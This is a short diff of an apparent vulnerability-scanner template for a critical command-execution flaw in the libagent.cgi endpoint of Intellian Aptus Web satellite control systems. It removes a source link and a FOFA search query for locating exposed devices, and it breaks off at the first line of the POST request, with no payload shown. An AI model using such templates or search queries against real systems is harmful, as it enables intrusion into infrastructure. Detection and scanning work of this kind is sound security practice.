@@ -3,12 +3,8 @@ info:
   name: Intellian Aptus Web 卫星控制系统 libagent.cgi 存在命令执行漏洞
   author: hacktwo
   severity: critical
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/yvgeanu9tl0plxwf'
+  description: ''
   tags: rce,2025
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: yvgeanu9tl0plxwf
-    fofa: title="intellian aptus web"
 http:
 - raw:
   - 'POST /cgi-bin/libagent.cgi?type=J HTTP/1.1
